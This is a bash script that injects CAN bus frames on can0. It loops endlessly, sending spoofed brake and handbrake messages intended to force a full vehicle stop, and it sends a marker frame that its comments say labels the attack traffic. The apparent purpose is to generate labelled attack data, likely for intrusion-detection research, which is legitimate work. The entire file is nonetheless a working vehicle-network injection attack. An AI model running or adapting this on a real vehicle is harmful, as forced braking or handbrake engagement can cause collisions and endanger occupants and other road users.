#!/bin/bash 

trap "cansend can0 010#01; echo 'Marker frame sent'; exit" SIGINT

count=0
while true; do
    # Send marker frame to indicate attack for data labeling
    while [[ $count -lt 1 ]]; do
        cansend can0 010#01
        sleep 0.1
        count=$((count + 1))
    done
    # Brakes 
    cansend can0 024#FFFF606060606060 # Normal brake message
    sleep 0.1
    cansend can0 1d3#01008A743AC9B735 # Handbrake message to ensure full vehicle stop
    sleep 0.1
done